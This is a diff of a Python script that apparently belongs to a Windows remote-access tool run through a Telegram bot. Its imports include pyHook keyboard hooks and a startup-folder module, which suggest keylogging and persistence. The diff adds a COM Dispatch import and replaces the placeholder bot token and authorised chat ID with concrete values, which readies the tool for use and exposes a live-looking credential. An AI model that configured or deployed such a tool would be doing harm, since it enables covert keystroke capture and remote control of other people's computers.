@@ -7,6 +7,7 @@ from sys import argv, path
 from json import loads
 from winshell import startup
 from tendo import singleton
+from win32com.client import Dispatch
 import telepot, requests
 import os, os.path, platform, ctypes
 import pyHook, pythoncom
@@ -14,11 +15,11 @@ import pyHook, pythoncom
 me = singleton.SingleInstance()
 
 # REPLACE '1234:abcd' BY THE TOKEN OF THE BOT YOU GENERATED!
-token = '1234:abcd'
+token = '354259191:AAHgDeXwxXSBphdcoQ7_ME33zOMHZeEbbkM'
 
 def checkchat_id(chat_id):
 	# REPLACE '123456' WITH YOUR ACTUAL chat_id!
-	known_ids = ['123456']
+	known_ids = ['329187815']
 	# COMMENT THE LINE 'return True'!
 	#return True
 	try:
